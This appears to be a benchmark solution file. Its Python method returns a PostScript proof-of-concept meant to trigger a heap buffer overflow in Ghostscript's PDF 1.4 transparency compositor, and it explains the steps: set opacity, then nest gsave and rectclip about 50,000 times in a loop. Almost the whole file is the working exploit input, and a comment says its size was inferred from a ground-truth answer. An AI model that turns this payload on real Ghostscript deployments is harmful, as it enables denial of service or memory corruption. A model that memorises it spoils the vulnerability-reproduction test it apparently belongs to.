import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Heap Buffer Overflow in Ghostscript's PDF 1.4 compositor
        (gdevp14) where the nesting depth of the layer/clip stack is not checked before 
        pushing a new clip mark.
        
        To trigger this:
        1. Enable the PDF 1.4 transparency device (using .setopacityalpha).
        2. Create a deeply nested structure of clips (using gsave + rectclip).
        3. Use a loop to keep the PoC file size small while generating high execution depth.
        """
        
        # PostScript PoC
        # 1. Header
        # 2. Enable transparency to use the vulnerable device (gdevp14)
        # 3. Define a loop body that nests gsave and rectclip
        # 4. Repeat ~50,000 times (inferred from ground truth size ~800KB)
        # 5. showpage to force execution/rendering
        
        poc = (
            b"%!PS\n"
            b"0.5 .setopacityalpha\n"
            b"/crash { gsave 0 0 1 1 rectclip } bind def\n"
            b"50000 { crash } repeat\n"
            b"showpage\n"
        )
        
        return poc